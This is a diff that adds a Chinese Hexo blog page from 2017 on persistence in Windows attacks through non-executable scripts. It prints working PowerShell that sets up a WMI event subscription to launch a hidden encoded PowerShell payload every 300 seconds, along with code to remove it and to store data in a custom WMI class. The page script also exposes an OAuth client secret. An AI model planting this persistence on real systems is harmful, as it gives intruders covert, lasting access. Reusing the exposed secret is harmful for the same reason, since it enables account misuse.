@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>Y11en</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+<header class="header">
+    <div class="header-inner">
+        <div class="header-title">
+
+        </div>
+        <nav class="header-nav">
+            
+            <a href="/" class="header-nav-link" >
+                首页
+            </a>
+            
+
+            
+            <a href="/archives" class="header-nav-link">
+                归档
+            </a>
+            
+
+            
+            <a href="/tags" class="header-nav-link">
+                标签
+            </a>
+            
+
+            
+            <a href="/about/" class="header-nav-link">
+                关于
+            </a>
+            
+        </nav>
+    </div>
+</header>
+<header class="mobile-header">
+    <div class="mobile-nav">
+        <div class="mobile-nav-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="mobile-nav-title">
+            <a href="/" class="mobile-nav-title-link">y11en's Blog</a>
+        </div>
+
+    </div>
+    <nav class="mobile-menu">
+        <ul class="mobile-menu-list">
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-home"></i>
+                <a href="/" class="mobile-nav-link">首页</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-archive"></i>
+                <a href="/archives" class="mobile-nav-link">归档</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-tag"></i>
+                <a href="/tags" class="mobile-nav-link">标签</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-about"></i>
+                <a href="/about/" class="mobile-nav-link">关于</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<div class="main">
+    <div class="content-inner">
+        <div class="posts">
+    <article class="post-whole">
+        <div class="post-title">
+            <h2 class="title">谈非PE在攻击中的&#34;持久性&#34;实现</h2>
+            <div class="post-meta">
+                <span class="post-time">2017-09-20</span>
+				
+                <span class="post-visit"> 阅读次数：<span id="busuanzi_value_page_pv"></span></span>
+            </div>
+        </div>
+        <div class="post-toc" id="post-toc">
+    <strong class="post-toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用WMI进行驻留"><span class="toc-text">使用WMI进行驻留</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows完整性机制与UAC"><span class="toc-text">Windows完整性机制与UAC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-text">后记</span></a></li></ol>
+    <div class="back-to-top" id="back-to-top">
+        <a href="javascript:void(0);">回到顶部</a>
+    </div>
+</div>
+        <div class="post-content">
+            <blockquote>
+</blockquote>
+<p>本文主要探讨针对Windows平台攻击中，如何以非PE方式完成“持久性”后门的实现。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Windows平台下，我们习惯性将与PE可执行文件相对立的“脚本”（通常以源代码文本存储）称之为非PE，例如用Js、Vbs、Powershell、Bat等编写的文件，亦或者是安装有运行时宿主进程环境下的C#、Java、Python、PHP等文件。由于这些非PE文件的类型众多，因而其存在的形式也各种各样，攻击载荷的投递方式也千变万化。一次成功的攻击流程应该是<code>信息收集 -&gt; 渗透攻击 -&gt; 后渗透攻击 -&gt;  结束？</code>其中“渗透攻击”经过一系列的攻击、绕过，从而接近”高价值“目标，在”后渗透攻击“阶段则进行价值挖掘，业务信息窃取等操作，同时为了保证攻击成果的最大化，通常需要保证从攻击方到目标点搭建一个稳定的、持续的通路，也即攻击的”持续性“。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="使用WMI进行驻留"><a href="#使用WMI进行驻留" class="headerlink" title="使用WMI进行驻留"></a>使用WMI进行驻留</h3><p>权限要求:管理员权限<br>下面代码功能为 间隔300s调起powershell执行一次$EncScript功能</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$fname</span> = <span class="string">"XXX Filter"</span></span><br><span class="line"><span class="variable">$cname</span> = <span class="string">"XXX Consumer"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$Query</span> = <span class="string">"SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</span></span><br><span class="line">	<span class="variable">$EncScript</span> = <span class="string">''</span></span><br><span class="line">				</span><br><span class="line">	<span class="variable">$fp</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">		NameSpace = (<span class="string">'root\subscription'</span>)</span><br><span class="line">		<span class="class"><span class="keyword">CLASS</span> = ('__<span class="title">EventFilter</span>')</span></span><br><span class="line"><span class="class">		<span class="title">Arguments</span> = @</span>&#123; Name = <span class="variable">$fname</span></span><br><span class="line">			EventNameSpace = (<span class="string">'root\cimv2'</span>)</span><br><span class="line">			QueryLanguage = (<span class="string">'WQL'</span>)</span><br><span class="line">			Query = <span class="variable">$Query</span></span><br><span class="line">		&#125;</span><br><span class="line">		Erroraction = (<span class="string">'SilentlyContinue'</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$wmif</span> = <span class="built_in">Set-WMIInstance</span> @fp</span><br><span class="line"></span><br><span class="line">	<span class="variable">$cp</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">		NameSpace = (<span class="string">'root\subscription'</span>)</span><br><span class="line">		<span class="class"><span class="keyword">CLASS</span> = ('<span class="title">CommandLineEventConsumer</span>')</span></span><br><span class="line"><span class="class">		<span class="title">Arguments</span> = @</span>&#123;name = <span class="variable">$cname</span> ; CommandlIneteMplate = (<span class="string">'powershell.exe -NoP -NonI -W Hidden -E '</span> + <span class="string">"<span class="variable">$EncScript</span>"</span>) &#125;</span><br><span class="line">		Erroraction = (<span class="string">'SilentlyContinue'</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$wmic</span> = <span class="built_in">Set-WMIInstance</span> @cp</span><br><span class="line">	<span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Namespace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;<span class="keyword">Filter</span>=<span class="variable">$wmif</span>;Consumer=<span class="variable">$wmic</span>&#125; </span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>针对上述后门的清除</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">Get-WMIObject</span> <span class="literal">-Namespace</span> root\Subscription <span class="literal">-Class</span> __EventFilter <span class="literal">-Filter</span> <span class="string">"Name='<span class="variable">$fname</span>'"</span> | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="built_in">Get-WMIObject</span> <span class="literal">-Namespace</span> root\Subscription <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-Filter</span> <span class="string">"Name='<span class="variable">$cname</span>'"</span> | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="built_in">Get-WMIObject</span> <span class="literal">-Namespace</span> root\Subscription <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Filter</span> <span class="string">"__Path LIKE '%XXX%'"</span> | <span class="built_in">Remove-WmiObject</span></span><br></pre></td></tr></table></figure>
+
+<p>WMI中存储数据</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$staticclass</span> = <span class="built_in">new-object</span> Management.ManagementClass(<span class="string">'root\default'</span>,<span class="variable">$null</span>,<span class="variable">$null</span>)</span><br><span class="line"><span class="variable">$staticclass</span>.Name = (<span class="string">'Win32_BotTag'</span>)</span><br><span class="line"><span class="variable">$staticclass</span>.put()</span><br><span class="line"></span><br><span class="line"><span class="comment">#存储</span></span><br><span class="line"><span class="variable">$staticclass</span>.properties.Add((<span class="string">'nob'</span>) , <span class="string">' '</span>)</span><br><span class="line"><span class="variable">$staticclass</span>.put()</span><br><span class="line"></span><br><span class="line"><span class="comment">#取出</span></span><br><span class="line">([<span class="type">WmiClass</span>] <span class="string">'root\default:Win32_BotTag'</span>).Properties[<span class="string">'nob'</span>]</span><br></pre></td></tr></table></figure>
+<p>鉴于权限要求为管理员权限，一般情况下均需要bypassUAC，接下来聊聊完整性约束和UAC的相关问题。</p>
+<h3 id="Windows完整性机制与UAC"><a href="#Windows完整性机制与UAC" class="headerlink" title="Windows完整性机制与UAC"></a>Windows完整性机制与UAC</h3><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>时隔2个月之后，再次来填这个坑已经填不动了，本文的主要内容已经通过文章、演讲的方式与大家分享，具体的链接如下，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Xdef2017议题&lt;非PE攻防之道&gt; http:&#x2F;&#x2F;www.xdef.org.cn&#x2F;xdef2017&#x2F;speakers.html</span><br><span class="line">&lt;No Power No Shell --- 非PE攻击中的套路&gt; https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-221871.htm</span><br></pre></td></tr></table></figure>
+
+<p>–本文完–</p>
+
+        </div>
+        
+    </article>
+</div>
+<div class="paginator">
+    
+        
+            <a class="prev" href="/2017/12/10/pwnable-tw-calc/">
+                <i class="iconfont icon-prev"></i>
+                <span class="nav-default">pwnable.tw-calc</span>
+                <span class="nav-mobile">上一篇</span>
+            </a>
+        
+        
+            <a class="next" href="/2017/03/05/Android%20Studio%20NDK%E9%85%8D%E7%BD%AE/">
+                <span class="nav-default">Android Studio NDK开发配置</span>
+                <span class="nav-mobile">下一篇</span>
+                <i class="iconfont icon-next"></i>
+            </a>
+        
+    
+</div>
+<div id="comment-container"></div>
+    </div>
+</div>
+<footer class="footer-social">
+    
+    <a class="social-link" target="_blank" href="https://github.com/y11en">
+        <i class="iconfont icon-github"></i>
+    </a>
+    
+
+    
+
+    
+
+    <div class="footer-copyright">
+        <p class="time-line">
+            &copy;
+            
+            
+                2015 -
+            
+            2020
+            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
+            <a target="_blank" href="https://github.com/iJinxin">y11en</a>
+        </p>
+        <p class="theme-info">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
+            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
+        </p>
+    </div>
+</footer>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    
+    var gitment = new Gitment({
+        id: '谈非PE在攻击中的"持久性"实现',
+        owner: 'y11en',
+        repo: 'blog_r3_comment',
+        oauth: {
+            client_id: '5049946d5d3f1d55996d',
+            client_secret: 'ebe785ea8e3f9b280d57a372588af2a202f0638c'
+        }
+    });
+    gitment.render('comment-container');
+    
+
+</script>
+</html>
